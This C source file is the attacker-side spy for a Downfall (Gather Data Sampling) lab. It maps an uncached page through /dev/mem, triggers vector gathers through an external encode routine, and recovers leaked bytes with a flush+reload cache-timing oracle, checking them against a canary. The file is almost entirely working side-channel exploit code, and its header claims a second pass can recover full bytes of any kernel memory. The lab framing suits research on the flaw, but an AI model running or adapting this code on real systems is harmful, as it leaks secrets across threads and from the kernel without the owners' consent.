/*
 * Cross-thread GDS spy -- attacker side (Downfall lab, Stage 1).
 *
 * Samples vector-register-file data through a UC-assist vpgatherdq (AVX2
 * port of the flowyroll/downfall s_load_encode shape) and encodes the low
 * qword of the sampled result into this lab's L1D geometry (spy.h):
 *   class = (byte ^ 0x3f) & 0x3f, 8 rows x 64 classes, stride 0x1040.
 * Each trial: flush the oracle, run one sample, reload every candidate.
 *
 * Knobs (env):
 *   CPU=1              logical CPU to pin
 *   CANARY=0x42        expected byte; EXP defaults to cls_of(CANARY)
 *   EXP=61 CTL=27      classes counted as expected/control
 *   ROUNDS=8 TRIALS=64 samples per round
 *   MINROWS=5          expected-class rows needed for a round majority
 *   LOADS=1            gather+encode repetitions per trial (upstream
 *                      LOAD_COUNT analogue; raises the canary catch rate)
 *   ESHIFT=0           encoder-side right shift (0-7) of the leaked qword;
 *                      ESHIFT=2 exposes bits 7..2 of each byte (second
 *                      pass for full-byte recovery on any kernel memory)
 *   ASSIST=uc|none     gather base: /dev/mem UC page or a normal WB page
 *   UCPHYS=0xfee00000  physical address for ASSIST=uc (probe first)
 *   PERM=0             lane rotation offset for vpermd
 *   PRINT=0            per-round per-row argmax + top-3 dump
 *   VERBOSE=0          per-trial hot lines
 *
 * Exit: 0 PASS (expected class majority in >=MINROWS rows in a majority
 * of rounds, control below), 1 FAIL, 2 VOID (setup/selftest).
 */

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include "spy.h"

extern void s_load_encode(const uint32_t *perm, uint8_t *oracle,
                          const void *base, unsigned shift);

static int cpu_id = 1;
static int rounds = 8;
static int trials = 64;
static int min_rows = 5;
static int loads = 1;
static unsigned eshift;
static int use_uc = 1;
static int perm_idx;
static int print_rows;
static int verbose;
static unsigned long uc_phys = UC_DEFAULT_PHYS;
static int canary = 0x42;
static int exp_cls = 61;
static int ctl_cls = 27;

static uint8_t *oracle;
static uint16_t hist[NROWS][NCLASS];

static void die(const char *msg)
{
    fprintf(stderr, "spy: %s: %s\n", msg, strerror(errno));
    exit(2);
}

static int env_int(const char *name, int def)
{
    const char *s = getenv(name);
    char *end;
    long v;

    if (s == NULL || s[0] == '\0')
        return def;
    v = strtol(s, &end, 0);
    if (end == s)
        return def;
    return (int)v;
}

static unsigned long env_ul(const char *name, unsigned long def)
{
    const char *s = getenv(name);
    char *end;
    unsigned long v;

    if (s == NULL || s[0] == '\0')
        return def;
    v = strtoul(s, &end, 0);
    if (end == s)
        return def;
    return v;
}

static void pin_cpu(int cpu)
{
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0)
        die("sched_setaffinity");
}

static inline void flush_slots(void)
{
    uint8_t *p;

    for (p = oracle; p < oracle + ORACLE_BYTES; p += SLOT_SIZE)
        asm volatile("clflush (%0)" :: "r"(p) : "memory");
    asm volatile("mfence\n\tlfence" ::: "memory");
}

static inline uint64_t reload_time(const void *p)
{
    unsigned lo, hi;
    uint64_t a, b;

    asm volatile("mfence\n\tlfence\n\trdtsc" : "=a"(lo), "=d"(hi) :: "memory");
    a = ((uint64_t)hi << 32) | lo;
    asm volatile("mov (%0), %%eax" :: "r"(p) : "eax", "memory");
    asm volatile("lfence\n\trdtsc" : "=a"(lo), "=d"(hi) :: "memory");
    b = ((uint64_t)hi << 32) | lo;
    return b - a;
}

static uint8_t *setup_base(void)
{
    void *p;

    if (!use_uc) {
        p = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (p == MAP_FAILED)
            die("mmap anon");
        memset(p, 0, 4096);
        return p;
    }

    {
        int fd = open("/dev/mem", O_RDWR | O_SYNC);

        if (fd < 0)
            die("open /dev/mem (ASSIST=uc implies root)");
        p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd,
                 (off_t)uc_phys);
        if (p == MAP_FAILED)
            die("mmap /dev/mem candidate (try UCPHYS; run devmem-probe)");
        (void)*(volatile uint8_t *)p;
        return p;
    }
}

int main(void)
{
    uint32_t perm[8];
    uint8_t *base;
    int r;
    int exp_maj_rounds = 0;
    int ctl_bad_rounds = 0;
    int exp_row_total[NROWS] = {0};
    int ctl_row_total[NROWS] = {0};
    int rr;
    unsigned long long total_hits = 0;
    unsigned long long total_exp = 0;

    {
        const char *a = getenv("ASSIST");

        use_uc = (a == NULL || strcmp(a, "none") != 0);
    }

    cpu_id = env_int("CPU", 1);
    rounds = env_int("ROUNDS", 8);
    trials = env_int("TRIALS", 64);
    min_rows = env_int("MINROWS", 5);
    loads = env_int("LOADS", 1);
    eshift = (unsigned)(env_int("ESHIFT", 0) & 7);
    perm_idx = env_int("PERM", 0);
    print_rows = env_int("PRINT", 0);
    verbose = env_int("VERBOSE", 0);
    canary = env_int("CANARY", 0x42);
    uc_phys = env_ul("UCPHYS", UC_DEFAULT_PHYS);

    if (cls_of(0x42) != 61 || cls_of(0x24) != 27 || cls_of(0x00) != 63) {
        fprintf(stderr, "spy: class map broken\n");
        return 2;
    }
    if (canary < 0 || canary > 255 || rounds < 1 || rounds > 64 ||
        trials < 1 || trials > 100000 || cpu_id < 0 || min_rows < 1 ||
        min_rows > NROWS || loads < 1 || loads > 64) {
        fprintf(stderr,
                "spy: bad CANARY, ROUNDS, TRIALS, CPU, MINROWS, or LOADS\n");
        return 2;
    }
    exp_cls = env_int("EXP", cls_of(canary));
    ctl_cls = env_int("CTL", (exp_cls == CLS_ALT) ? 61 : CLS_ALT);

    pin_cpu(cpu_id);

    oracle = mmap(NULL, ORACLE_BYTES, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (oracle == MAP_FAILED)
        die("mmap oracle");
    {
        size_t i;

        for (i = 0; i < ORACLE_BYTES; i += 4096)
            oracle[i] = 1;
    }

    base = setup_base();

    printf("spy cpu=%d running_on=%d canary=0x%02x exp=%d ctl=%d "
           "rounds=%d trials=%d min_rows=%d loads=%d eshift=%u assist=%s "
           "base=%p perm0=%d stride=0x%x hot<%d\n",
           cpu_id, sched_getcpu(), canary, exp_cls, ctl_cls, rounds, trials,
           min_rows, loads, eshift, use_uc ? "uc" : "none", (void *)base,
           perm_idx, SLOT_SIZE, HOT_CYCLES);
    fflush(stdout);

    /* geometry selftest (architectural, root-free semantics) */
    flush_slots();
    asm volatile("mov (%0), %%eax" :: "r"(slot(oracle, 0, exp_cls)) : "eax",
                 "memory");
    {
        uint64_t hot = reload_time(slot(oracle, 0, exp_cls));
        uint64_t cold = reload_time(slot(oracle, 0, ctl_cls));

        printf("selftest hot%d=%llu cold%d=%llu threshold=%d %s\n",
               exp_cls, (unsigned long long)hot, ctl_cls,
               (unsigned long long)cold, HOT_CYCLES,
               (hot < HOT_CYCLES && cold >= HOT_CYCLES) ? "OK" : "FAIL");
        if (!(hot < HOT_CYCLES && cold >= HOT_CYCLES)) {
            printf("verdict: VOID selftest\n");
            return 2;
        }
    }

    for (r = 0; r < rounds; r++) {
        int row_hits_exp[NROWS] = {0};
        int row_hits_ctl[NROWS] = {0};
        int row_total[NROWS] = {0};
        int t, row, c;
        int rows_exp = 0, rows_ctl = 0, rows_any = 0;

        for (c = 0; c < 8; c++)
            perm[c] = (uint32_t)((c + perm_idx + r) & 7);
        memset(hist, 0, sizeof(hist));

        for (t = 0; t < trials; t++) {
            int k;

            flush_slots();
            for (k = 0; k < loads; k++)
                s_load_encode(perm, oracle, base, eshift);
            for (row = 0; row < NROWS; row++) {
                for (c = 0; c < NCLASS; c++) {
                    uint64_t dt = reload_time(slot(oracle, row, c));

                    if (dt < HOT_CYCLES) {
                        if (c == exp_cls)
                            row_hits_exp[row]++;
                        if (c == ctl_cls)
                            row_hits_ctl[row]++;
                        row_total[row]++;
                        if (print_rows)
                            hist[row][c]++;
                        if (verbose)
                            printf("round %d trial %d row %d hot class %d "
                                   "t=%llu\n",
                                   r, t, row, c, (unsigned long long)dt);
                    }
                }
            }
        }

        for (row = 0; row < NROWS; row++) {
            if (row_hits_exp[row] * 2 > trials)
                rows_exp++;
            if (row_hits_ctl[row] * 2 > trials)
                rows_ctl++;
            if (row_total[row] > 0)
                rows_any++;
            exp_row_total[row] += row_hits_exp[row];
            ctl_row_total[row] += row_hits_ctl[row];
            total_hits += (unsigned long long)row_total[row];
            total_exp += (unsigned long long)row_hits_exp[row];
        }
        printf("round %d rows_exp=%d/%d rows_ctl=%d/%d rows_any=%d/%d\n",
               r, rows_exp, NROWS, rows_ctl, NROWS, rows_any, NROWS);
        if (print_rows) {
            for (row = 0; row < NROWS; row++) {
                int am = 0, amh = hist[row][0];
                int t1 = -1, t2 = -1, t3 = -1;
                int h1 = 0, h2 = 0, h3 = 0;

                for (c = 1; c < NCLASS; c++)
                    if (hist[row][c] > amh) {
                        am = c;
                        amh = hist[row][c];
                    }
                printf("round %d row %d argmax=%d hits=%d/%d\n",
                       r, row, am, amh, trials);
                for (c = 0; c < NCLASS; c++) {
                    int h = hist[row][c];

                    if (h == 0)
                        continue;
                    if (h > h1) {
                        h3 = h2; t3 = t2;
                        h2 = h1; t2 = t1;
                        h1 = h; t1 = c;
                    } else if (h > h2) {
                        h3 = h2; t3 = t2;
                        h2 = h; t2 = c;
                    } else if (h > h3) {
                        h3 = h; t3 = c;
                    }
                }
                printf("round %d row %d top3 %d:%d %d:%d %d:%d\n",
                       r, row, t1, h1, t2, h2, t3, h3);
            }
        }
        if (rows_exp >= min_rows)
            exp_maj_rounds++;
        if (rows_ctl >= min_rows)
            ctl_bad_rounds++;
        fflush(stdout);
    }

    for (rr = 0; rr < NROWS; rr++)
        printf("rate row %d exp=%.3f%% ctl=%.3f%% (n=%d)\n", rr,
               100.0 * exp_row_total[rr] / (rounds * trials),
               100.0 * ctl_row_total[rr] / (rounds * trials),
               rounds * trials);

    printf("summary rounds=%d exp_majority=%d ctl_majority=%d "
           "total_hits=%llu exp_hits=%llu\n",
           rounds, exp_maj_rounds, ctl_bad_rounds, total_hits, total_exp);
    {
        int pass = (exp_maj_rounds * 2 > rounds) &&
                   (ctl_bad_rounds * 2 <= rounds);

        printf("verdict: %s\n", pass ? "PASS" : "FAIL");
        return pass ? 0 : 1;
    }
}
